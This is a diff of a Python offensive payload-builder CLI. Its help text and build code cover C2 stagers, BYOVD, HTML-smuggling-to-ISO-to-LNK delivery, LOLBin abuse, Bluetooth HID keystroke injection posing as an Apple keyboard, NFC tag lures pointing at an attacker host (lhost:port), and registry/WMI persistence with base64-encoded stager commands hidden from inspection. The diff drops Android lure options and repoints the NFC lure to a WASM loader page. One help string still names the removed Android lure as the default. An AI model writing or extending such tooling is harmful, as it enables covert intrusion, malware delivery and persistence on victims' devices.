@@ -110,8 +110,6 @@ BUILD FLAGS
                           (default: Apple Wireless Keyboard)
     --ble-out DIR       Output directory  (default: <workspace>/ble/)
 
-  --android-ble         Generate BLE HID payload targeting Android devices
-  --android-payload     Generate Android server-side files: APK lure page + Termux stager
 
   --smuggle [TOOL]      HTML smuggling → ISO → LNK delivery chain:
                           • Browser downloads ISO via HTML blob URL (no server request)
@@ -679,9 +677,8 @@ def cmd_build(args, cfg, ws):
         nfc_out  = getattr(args, "nfc_out", None) or ws.path("nfc")
         nfc_url  = getattr(args, "nfc_url", None)
         if not nfc_url:
-            scheme     = "https"
-            url_prefix = "/android/"
-            nfc_url    = f"{scheme}://{lhost}:{port}{url_prefix}"
+            scheme  = "https"
+            nfc_url = f"{scheme}://{lhost}:{port}/wasm_loader.html"
         build_nfc_payload(nfc_url, nfc_out)
         did_something = True
 
@@ -787,7 +784,6 @@ def cmd_build(args, cfg, ws):
         print("    --shellcode FILE --name NAME, --c2-stager, --byovd, --usb TOOL,")
         print("    --ble TOOL, --smuggle [TOOL], --ntlm-trigger, --ads [TOOL],")
         print("    --lolbin mshta|regsvr32|msbuild|all,")
-        print("    --android-ble, --android-payload, --android-ble + --android-payload,")
         print("    or --wasm [--wasm-exe NAME] [--wasm-title TITLE]")
 
 
@@ -807,7 +803,6 @@ def _build_persist_cmd(persist_type: str, cfg: dict, ws: Workspace) -> str | Non
     All three store the stager download command base64-encoded (-enc) so no raw
     URL or PowerShell commands appear in registry/WMI values at rest.
     """
-    from builders.stager import _rv, _xurl
     import base64 as _b64
     import secrets as _sec
 
@@ -1501,7 +1496,7 @@ def main():
     build_p.add_argument("--ble-name",       metavar="NAME",  dest="ble_name",   default="Apple Wireless Keyboard",
                          help="BLE device name shown on target pairing dialog (default: 'Apple Wireless Keyboard')")
     build_p.add_argument("--nfc",          action="store_true", dest="nfc",
-                         help="Generate NFC tag NDEF binary for mobile delivery (default URL: https://lhost:port/android/)")
+                         help="Generate NFC tag NDEF binary for mobile delivery (default URL: https://lhost:port/wasm_loader.html)")
     build_p.add_argument("--nfc-url",      metavar="URL",   dest="nfc_url",  default=None,
                          help="Override NFC tag URL (default: Android APK lure page)")
     build_p.add_argument("--nfc-out",      metavar="DIR",   dest="nfc_out",  default=None,
